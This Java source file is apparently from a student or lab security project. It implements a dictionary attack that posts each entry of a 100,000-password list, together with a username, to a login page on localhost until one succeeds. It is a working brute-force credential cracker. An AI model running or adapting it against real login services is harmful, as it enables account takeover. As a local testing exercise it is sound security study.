
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Map;

public class SecEyeXDico extends SecEyeX {
    
    public String attaque(String username) throws Exception {
        System.out.println("En cours de craquage par dictionary attack...");


        String returnedPassword;
        long debut = System.currentTimeMillis();

        returnedPassword = parDictionnaire(username);
        long fin = System.currentTimeMillis();
        long tempsEcoule = (fin - debut)/(1000);

        System.out.println("temps ecoule : "+tempsEcoule+"s");
        return returnedPassword;

        
    }

    
    public String parDictionnaire(String username) throws Exception{
        try {
            File file = new File("../secEyeXDico/10-million-password-list-top-100000.txt");
            FileReader fileReader = new FileReader(file);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            String line;
            while((line = bufferedReader.readLine()) != null)
            {
                Map<String, String> params = new HashMap<>();
                params.put("username", username);
                params.put("password", line);

                String url = "http://localhost/SecEyeX/SecEyeX.php";
                HttpResponse<String> reponse; 
                reponse = SecEyeXControle.mdHttp(url, params);

                int statusCode = reponse.statusCode();
                if(statusCode == 200){
                    String responseBody = reponse.body();

                    System.out.println("Code de statut : " + statusCode);
                    System.out.println("Corps de la réponse : " + responseBody);

                    bufferedReader.close();
                    return line;
                }
                    
            }

            fileReader.close();    
            return null;
            

            
            
        } catch (IOException e) {
            // TODO: handle exception
            System.out.println("ngandiy maami probleme");
        }
        return "";
    }




    
}
